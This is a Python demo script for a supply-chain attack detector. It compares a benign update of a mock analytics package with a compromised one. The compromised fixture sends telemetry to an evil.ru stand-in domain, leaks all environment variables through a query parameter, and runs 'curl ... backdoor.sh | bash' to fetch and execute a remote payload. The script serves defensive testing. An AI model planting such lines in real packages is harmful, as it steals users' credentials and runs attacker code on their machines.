#!/usr/bin/env python3
"""
Demonstrates detection of a stealth supply chain attack.

Creates two versions of a package:
  v1 — legitimate analytics client
  v2 — compromised: URLs redirected, credentials exfiltrated, payload injected

Shows side-by-side: benign update vs stealth attack.
"""

import json
import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, os.path.dirname(__file__))

from storage.db import init_db
init_db()

from analysis.differ import analyze_local

# ---------------------------------------------------------------------------
# Package source code
# ---------------------------------------------------------------------------

V1 = {
    "src/client.py": '''
import os
import requests

def send_telemetry(event_name, metadata):
    """Send usage telemetry to our analytics service."""
    payload = {"event": event_name, "meta": metadata}
    requests.post("https://analytics.mycompany.com/v1/events", json=payload)

def get_config():
    """Load config from our API."""
    api_key = os.environ.get("APP_API_KEY", "")
    resp = requests.get("https://api.mycompany.com/config",
                        headers={"Authorization": api_key})
    return resp.json()

def run_healthcheck():
    """Check service health."""
    import subprocess
    result = subprocess.run("curl -s https://status.mycompany.com/health",
                           shell=True, capture_output=True)
    return result.returncode == 0
''',
    "setup.py": 'from setuptools import setup\nsetup(name="analytics-client", version="1.0.0")\n',
}

V2_BENIGN = {
    "src/client.py": '''
import os
import requests

def send_telemetry(event_name, metadata):
    """Send usage telemetry to our analytics service."""
    payload = {"event": event_name, "meta": metadata, "sdk_version": "2.0"}
    requests.post("https://analytics.mycompany.com/v2/events", json=payload)

def get_config():
    """Load config from our API."""
    api_key = os.environ.get("APP_API_KEY", "")
    resp = requests.get("https://api.mycompany.com/v2/config",
                        headers={"Authorization": api_key})
    return resp.json()

def run_healthcheck():
    """Check service health."""
    import subprocess
    result = subprocess.run("curl -s https://status.mycompany.com/v2/health",
                           shell=True, capture_output=True)
    return result.returncode == 0

def validate_response(data):
    """New helper — validates API responses."""
    if not isinstance(data, dict):
        raise ValueError("Expected dict response")
    return True
''',
    "setup.py": 'from setuptools import setup\nsetup(name="analytics-client", version="2.0.0")\n',
}

V2_ATTACK = {
    "src/client.py": '''
import os
import requests

def send_telemetry(event_name, metadata):
    """Send usage telemetry to our analytics service."""
    payload = {"event": event_name, "meta": metadata}
    # COMPROMISED: URL changed to attacker domain
    requests.post("https://telemetry-cdn.evil.ru/v1/events", json=payload)

def get_config():
    """Load config from our API."""
    api_key = os.environ.get("APP_API_KEY", "")
    # COMPROMISED: exfiltrating ALL env vars as query parameter
    resp = requests.get("https://api.mycompany.com/config",
                        headers={"Authorization": api_key},
                        params={"d": str(os.environ)})
    return resp.json()

def run_healthcheck():
    """Check service health."""
    import subprocess
    # COMPROMISED: downloading and executing remote payload
    result = subprocess.run("curl -s https://dl.evil.ru/backdoor.sh | bash",
                           shell=True, capture_output=True)
    return result.returncode == 0
''',
    "setup.py": 'from setuptools import setup\nsetup(name="analytics-client", version="2.0.0")\n',
}


def write_tree(base: Path, files: dict):
    for relpath, content in files.items():
        p = base / relpath
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)


def print_section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def print_report(report):
    d = report.to_dict()
    score = d["risk_score"]
    color = "\033[91m" if score >= 80 else "\033[93m" if score >= 30 else "\033[92m"
    reset = "\033[0m"

    print(f"\n  Risk Score: {color}{score}{reset}")

    # Features
    features = d.get("features", {})
    nz = {k: v for k, v in features.items() if v and v != 0 and v != 0.0}
    if nz:
        print(f"  Features: {nz}")

    # Anomalies
    anom = d.get("anomalies", {})
    if anom.get("anomaly_count", 0):
        print(f"  Anomalies: {anom['anomaly_count']}")

    # Scoring
    for exp in d.get("scoring_explanations", []):
        if "COMBO" in exp or "ANOMALY" in exp:
            print(f"  {color}{exp}{reset}")

    # Mutations
    mutations = [f for f in d["flags"] if "mutation:" in f["pattern"]]
    if mutations:
        print(f"\n  Detected Mutations ({len(mutations)}):")
        for m in mutations:
            print(f"    [{m['category']}] {m['snippet']}")
    else:
        print(f"\n  No suspicious mutations detected.")


# ---------------------------------------------------------------------------

if __name__ == "__main__":
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        v1_dir = tmp / "v1"
        v2_benign_dir = tmp / "v2_benign"
        v2_attack_dir = tmp / "v2_attack"

        write_tree(v1_dir, V1)
        write_tree(v2_benign_dir, V2_BENIGN)
        write_tree(v2_attack_dir, V2_ATTACK)

        # --- Benign update ---
        print_section("SCENARIO 1: Benign Update (v1 → v2)")
        print("  Changes: /v1/ → /v2/ endpoints, added validate_response()")
        report_benign = analyze_local(v1_dir, v2_benign_dir, name="analytics-client")
        print_report(report_benign)

        # --- Stealth attack ---
        print_section("SCENARIO 2: Stealth Attack (v1 → v2-compromised)")
        print("  Same package, same structure, but:")
        print("    1. URL redirected to evil.ru")
        print("    2. os.environ exfiltrated via query params")
        print("    3. Subprocess downloads/executes remote payload")
        report_attack = analyze_local(v1_dir, v2_attack_dir, name="analytics-client")
        print_report(report_attack)

        # --- Comparison ---
        print_section("COMPARISON")
        print(f"  Benign update:  score = {report_benign.risk_score}")
        print(f"  Stealth attack: score = {report_attack.risk_score}")
        ratio = report_attack.risk_score / max(report_benign.risk_score, 1)
        print(f"  Ratio: {ratio:.0f}x")
        print()
